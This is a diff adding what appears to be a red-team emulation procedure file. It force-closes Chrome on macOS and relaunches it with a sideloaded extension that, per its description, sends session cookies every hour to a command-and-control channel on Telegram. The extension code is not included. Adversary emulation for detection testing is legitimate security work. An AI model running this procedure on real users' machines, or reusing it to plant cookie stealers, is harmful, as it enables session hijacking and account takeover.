@@ -1,0 +1,62 @@
+api_version: 2.0
+uuid: 3f559d8d-6a0e-45c1-8e61-0f292b8fd459
+name: "Sideload Malicious Chrome Extension"
+authors:
+  - godlovepenn
+description: |
+  This TTP loads a custom malicious browser extension that allows a user to view websites visited,
+  but also has capabilities to exfiltrate cookies to a C2 server.
+
+  NOTE: Google has officially removed the --load-extension flag from Chrome 137+.
+  This TTP will not work on Chrome 137 or later.
+  See: https://github.com/cypress-io/cypress/issues/31690
+
+  The TTP performs the following steps:
+  1. Kills any running Chrome instances
+  2. Launches Chrome with the modified malicious extension
+  3. The malicious extension will automatically exfiltrate cookies to telegram messenger every hour
+
+args:
+  - name: extension
+    description: The browser extension to load for cookie extraction
+    type: string
+    default: history
+  - name: wait_time
+    description: Time to wait (in seconds) before closing the browser
+    type: int
+    default: 7
+  - name: auto_cleanup
+    description: Automatically close Chrome after execution
+    type: bool
+    default: false
+
+requirements:
+  platforms:
+    - os: darwin
+mitre:
+  tactics:
+    - "TA0006 Credential Access"
+  techniques:
+    - "T1539 Steal Web Session Cookie"
+steps:
+  - name: prepare_and_load_extension
+    description: Kill any running Chrome instances and launch Chrome with the specified extension
+    inline: |
+      # Kill any running Chrome instances
+      pkill -i "Google Chrome" || true
+
+      sleep 3  # Give Chrome time to fully shut down
+
+      # Launch Chrome with the extension
+      open -a "Google Chrome" --args --load-extension=$(pwd)/src/{{.Args.extension}} --restore-last-session
+
+  {{if .Args.auto_cleanup}}
+  - name: cleanup_browser
+    description: Wait for the specified time and then close Chrome
+    inline: |
+      # Wait for user interaction with the extension
+      sleep {{.Args.wait_time}}
+
+      # Close Chrome
+      pkill -i "Google Chrome" || true
+  {{end}}
